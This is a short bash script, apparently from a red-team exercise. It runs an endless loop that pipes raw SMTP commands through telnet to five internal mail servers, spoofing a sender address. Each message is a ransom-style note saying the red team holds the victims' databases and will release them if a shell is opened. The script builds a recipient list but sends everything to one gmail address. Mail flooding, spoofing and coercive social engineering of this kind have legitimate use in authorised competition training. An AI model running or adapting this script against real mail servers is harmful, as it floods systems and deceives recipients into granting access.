#!/bin/bash

hostarray=(10.10.103.25 10.10.104.25 10.10.105.25 10.10.107.25 10.10.108.25)
userlist=("root@halcorp.biz","andrew@halcorp.biz","matthew@halcorp.biz","philip@halcorp.biz","simon@halcorp.biz","thomas@halcorp.biz","nate@halcorp.biz","emma@halcorp.biz","madison@halcorp.biz","abigail@halcorp.biz","olivia@halcorp.biz","isabella@halcorp.biz","hannah@halcorp.biz")
port=25
x=0

set timeout 20
sleep 1

while [ $x -eq 0 ]
do

for item in ${hostarray[*]}
do
host=$item

for user in ${userlist[*]}
do
receipt="rcpt to: $user"

(echo open $host $port
sleep 1

echo "mail from: shadow_hunter@example.com"
sleep 2
echo "rcpt to: wda2p2@gmail.com"
sleep 2
echo "data"
sleep 2
echo "subject: Red Team is Awesome"
echo 
echo 
echo "This is the red team.  We have your databases.  Please open ANY shell, and we will release your databases.  This message was distributed evenly to all teams.  If you have settled negotiations with us, please disregard this message."
sleep 5
echo .
sleep 5
echo "exit" ) | telnet

done

done

done
